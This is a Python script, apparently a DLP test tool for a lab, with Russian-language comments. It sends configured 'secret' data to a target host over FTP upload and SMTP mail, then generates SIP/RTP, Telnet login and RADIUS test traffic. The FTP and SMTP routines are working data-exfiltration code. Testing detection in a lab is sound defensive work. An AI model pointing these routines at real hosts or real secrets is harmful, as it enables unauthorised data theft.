import ftplib
import smtplib
import socket
import os
import time
import config

HOST = config.LAB_SERVER_IP
SECRET = config.SECRET_DATA

def log(msg): print(f"[FULL-AUDIT] {msg}")

def test_ftp():
    log(f"--- Тест FTP ({HOST}:21) ---")
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, 21)
        ftp.login("dlpuser", "dlpsecret")
        
        fname = "leak.txt"
        with open(fname, "w") as f: f.write(SECRET)
        
        with open(fname, "rb") as f: ftp.storbinary(f"STOR {fname}", f)
        ftp.quit()
        os.remove(fname)
        log("   [OK] Файл загружен.")
    except Exception as e:
        log(f"   [FAIL] Ошибка FTP: {e}")

def test_smtp_internal():
    log(f"--- Тест SMTP Internal ({HOST}:1025) ---")
    try:
        server = smtplib.SMTP(HOST, 1025)
        msg = f"Subject: CONFIDENTIAL LEAK\n\n{SECRET}"
        server.sendmail("hacker@test.local", "admin@corp.local", msg.encode('utf-8'))
        server.quit()
        log("   [OK] Письмо отправлено.")
    except Exception as e:
        log(f"   [FAIL] Ошибка SMTP: {e}")

def test_sip_voip():
    log(f"--- Тест VoIP/SIP ({HOST}:5060) ---")
    # Эмулируем SIP INVITE и RTP поток
    try:
        # 1. SIP INVITE (UDP)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        invite = f"INVITE sip:100@{HOST} SIP/2.0\r\nCall-ID: 12345\r\nFrom: attacker\r\n".encode()
        sock.sendto(invite, (HOST, 5060))
        
        # 2. RTP Stream (Голос) - шлем шум на порты RTP
        log("   [..] Отправка RTP аудио потока...")
        for i in range(50):
            # Случайные байты имитируют зашифрованный голос
            payload = os.urandom(160) 
            sock.sendto(payload, (HOST, 10000)) # Порт RTP из конфига Asterisk
            time.sleep(0.02)
            
        sock.close()
        log("   [OK] SIP звонок и RTP трафик сгенерированы.")
    except Exception as e:
        log(f"   [FAIL] Ошибка SIP: {e}")

def test_telnet():
    log(f"--- Тест Telnet ({HOST}:23) ---")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((HOST, 23))
        s.recv(1024) # Banner
        s.send(b"user\n")
        time.sleep(0.5)
        s.send(b"pass\n")
        s.close()
        log("   [OK] Telnet соединение установлено.")
    except Exception as e:
        log(f"   [FAIL] Ошибка Telnet: {e}")

def test_radius():
    log(f"--- Тест Radius ({HOST}:1812) ---")
    # Отправляем "Fake" пакет Access-Request
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Radius Packet Structure: Code(1) + ID + Len + Auth
        packet = b'\x01\x01\x00\x14' + b'\x00'*16 
        sock.sendto(packet, (HOST, 1812))
        sock.close()
        log("   [OK] Radius пакет отправлен.")
    except Exception as e:
         log(f"   [FAIL] {e}")

if __name__ == "__main__":
    print(f"Цель атаки: {HOST}")
    if HOST == "192.168.1.X":
        print("[!] ОШИБКА: Вы не поменяли IP адрес в файле config.py!")
    else:
        test_ftp()
        test_smtp_internal()
        test_sip_voip()
        test_telnet()
        test_radius()
